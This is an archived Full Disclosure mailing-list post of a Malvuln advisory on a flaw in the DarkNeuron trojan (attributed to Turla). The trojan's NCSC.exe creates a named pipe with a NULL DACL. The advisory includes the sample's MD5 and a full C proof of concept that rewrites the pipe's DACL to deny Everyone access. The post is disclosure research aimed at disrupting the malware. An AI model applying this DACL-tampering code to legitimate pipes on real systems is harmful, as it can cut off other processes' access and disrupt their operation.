---
title: Trojan.Win32.DarkNeuron.gen / Named Pipe Null DACL
url: https://seclists.org/fulldisclosure/2022/Nov/22
source: Full Disclosure
date: 2022-11-30
fetch_date: 2025-10-04T00:08:14.077710
---

# Trojan.Win32.DarkNeuron.gen / Named Pipe Null DACL

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](21)
[By Date](date.html#22)
[![Next](/images/right-icon-16x16.png)](23)

[![Previous](/images/left-icon-16x16.png)](21)
[By Thread](index.html#22)
[![Next](/images/right-icon-16x16.png)](23)

![](/shared/images/nst-icons.svg#search)

# Trojan.Win32.DarkNeuron.gen / Named Pipe Null DACL

---

*From*: malvuln <malvuln13 () gmail com>
*Date*: Thu, 24 Nov 2022 20:31:51 -0500

---

```
Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2022
Original source:
https://malvuln.com/advisory/d891c9374ccb2a4cae2274170e8644d8.txt
Contact: malvuln13 () gmail com
Media: twitter.com/malvuln
Backup media: infosec.exchange/@malvuln

Threat: Trojan.Win32.DarkNeuron.gen
Vulnerability: Named Pipe Null DACL
Family: DarkNeuron (Turla Group)
Type: PE32
MD5: d891c9374ccb2a4cae2274170e8644d8
Vuln ID: MVID-2022-0661
Disclosure: 11/24/2022
Description: The malware process "NCSC.exe" creates an IPC pipe with a NULL
DACL allowing RW for the Everyone user group.

\\.\Pipe\Winsock2\baseapi_http
  RW Everyone
  RW BUILTIN\Administrators

Local low privileged users can modify the DACL to remove rights for the
Everyone users group, denying access to use the pipe for further RW
interprocess communications.

Exploit/PoC:
#include "windows.h"
#include "stdio.h"
#include "accctrl.h"
#include "aclapi.h"

/*
Trojan.Win32.DarkNeuron.gen (Turla Group) NCSC.exe
MD5: d891c9374ccb2a4cae2274170e8644d8
NamedPipe Exploit Deny Access to Everyone
By Malvuln
Nov of 2022
**/

#define VULN_TROJAN_PIPE "\\\\.\\pipe\\Winsock2\\baseapi_http"

int main(void){

HANDLE hPipe = CreateFileA((LPCSTR)VULN_TROJAN_PIPE, GENERIC_WRITE |
WRITE_DAC, 0, NULL, OPEN_EXISTING, NULL, NULL);
PACL pOldDACL = NULL;
PACL pNewDACL = NULL;

if (hPipe == INVALID_HANDLE_VALUE){
    printf("%d", GetLastError());
return 1;
}

  if(GetSecurityInfo(hPipe, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,
NULL, NULL, &pOldDACL, NULL, NULL) != ERROR_SUCCESS){
  printf("%d", GetLastError());
  return 1;
  }

    TRUSTEE trustee[1];
    trustee[0].TrusteeForm = TRUSTEE_IS_NAME;
    trustee[0].TrusteeType = TRUSTEE_IS_GROUP;
    trustee[0].ptstrName = TEXT("Everyone");
    trustee[0].MultipleTrusteeOperation = NO_MULTIPLE_TRUSTEE;
    trustee[0].pMultipleTrustee = NULL;

    EXPLICIT_ACCESS explicit_access_list[1];
    ZeroMemory(&explicit_access_list[0], sizeof(EXPLICIT_ACCESS));

    explicit_access_list[0].grfAccessMode = DENY_ACCESS;
    explicit_access_list[0].grfAccessPermissions = GENERIC_ALL;
    explicit_access_list[0].grfInheritance = NO_INHERITANCE;
    explicit_access_list[0].Trustee = trustee[0];

    if(SetEntriesInAcl(1, explicit_access_list, pOldDACL, &pNewDACL) !=
ERROR_SUCCESS){
    printf("%d", GetLastError());
    return 1;
    }

    if(SetSecurityInfo(hPipe, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,
NULL, NULL, pNewDACL, NULL) != ERROR_SUCCESS){
       printf("%d", GetLastError());
  return 1;
      }else{
      printf("Trojan.Win32.DarkNeuron.gen (Turla Group) PWNED!\n");
      printf("By Malvuln\n");
      printf("Nov of 2022\n");
      }

LocalFree(pNewDACL);
    LocalFree(pOldDACL);
    CloseHandle(hPipe);

    system("pause");

return 0;
}

Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory,
provided that it is not altered except by reformatting it, and that due
credit is given. Permission is explicitly given for insertion in
vulnerability databases and similar, provided that due credit is given to
the author. The author is not responsible for any misuse of the information
contained herein and accepts no responsibility for any damage caused by the
use or misuse of this information. The author prohibits any malicious use
of security related information or exploits by the author or elsewhere. Do
not attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper Malware
handling or the downloading of ANY Malware mentioned on this website or
elsewhere. All content Copyright (c) Malvuln.com (TM).
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](21)
[By Date](date.html#22)
[![Next](/images/right-icon-16x16.png)](23)

[![Previous](/images/left-icon-16x16.png)](21)
[By Thread](index.html#22)
[![Next](/images/right-icon-16x16.png)](23)

### Current thread:

* **Trojan.Win32.DarkNeuron.gen / Named Pipe Null DACL** *malvuln (Nov 29)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")